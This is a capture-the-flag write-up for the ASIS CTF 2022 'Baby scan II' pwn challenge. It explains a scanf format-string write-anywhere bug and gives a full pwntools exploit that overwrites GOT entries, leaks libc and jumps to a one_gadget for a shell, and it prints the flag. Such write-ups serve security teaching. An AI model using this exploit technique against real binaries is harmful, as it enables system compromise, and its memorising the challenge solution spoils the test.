---
title: "[Pwn] Baby scan II [AsisCTF 2022 Qual]"
date: 2022-10-15 21:06:00
---

# 0x0 Introduction

Baby scan II

It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.

nc 65.21.255.31 33710


files: [babyscan_2](babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerbility

The source code is also given.

```
int main() {
  char size[16], fmt[8], *buf;

  printf("size: ");
  scanf("%15s", size);
  if (!isdigit(*size)) {
    puts("[-] Invalid number");
    exit(1);
  }

  buf = (char*)malloc(atoi(size) + 1);

  printf("data: ");
  snprintf(fmt, sizeof(fmt), "%%%ss", size);
  scanf(fmt, buf);

  exit(0);
}
```

The code here is similar to [baby_scan_1](../baby_scan_1). There are two main difference between this challenge and previous one.

1. `alloc` is replaced by `malloc`
2. program exit instead of ret.

Since program have PIE disabled and we can control the scanf format string. We basically have a write anywhere.

The idea is simple: write target address into the last 8 byte of local variable `size`. use `%9$s` to scan character into that address
```
===
some stack value           <== rsp
9$s\x00\x00\x00\x00\x00    <== size[16]
target_address
RBP
RIP
====
```

Also, since it is partial RELRO, we can overwrite the jmp address of `exit` in GOT and make it jump back to `main` again. Now we have an infinite number of write anywhere.

To leak the address. We can overwrite jmp address of `atoi` with `printf`. Then, we can leak libc address on the stack using `%{offset}$p`


# 0x3 Exploit

```python
from pwn import *

exe = ELF("chall")
exe_rop = ROP(exe)
if args.LOCAL:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    libc = ELF("libc.so.6")

context.binary = exe

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("65.21.255.31", 33710)
    return r


io = start()

one_gadget = 0xe3b01
# one_gadget = 0xe3b31

io.sendlineafter(b"size: ",b"9$s"+b'\x00'*5+exe.got["exit"].to_bytes(8,"little")[:-2:])
io.sendlineafter(b"data: ",exe.sym["main"].to_bytes(8,"little")[:-2:])

io.sendlineafter(b"size: ",b"9$s"+b'\x00'*5+exe.got["atoi"].to_bytes(8,"little")[:-2:])
io.sendlineafter(b"data: ",exe.sym["printf"].to_bytes(8,"little")[:-2:])

io.sendlineafter(b"size",b"1%29$p")
lp(io.recvuntil(b'10x'))
libc.address = int(io.recvuntil(b'data: ',drop=True),16) - libc.libc_start_main_return
lp("libc base",hex(libc.address))
io.sendline(b"\x00")

io.sendlineafter(b"size: ",b"9$s"+b'\x00'*5+exe.got["exit"].to_bytes(8,"little")[:-2:])
io.sendlineafter(b"data: ",(libc.address+one_gadget).to_bytes(8,"little")[:-2:])

io.interactive()

```

# 0x4 Flag

ASIS{fd408e00d5824d7220c4d624f894144e}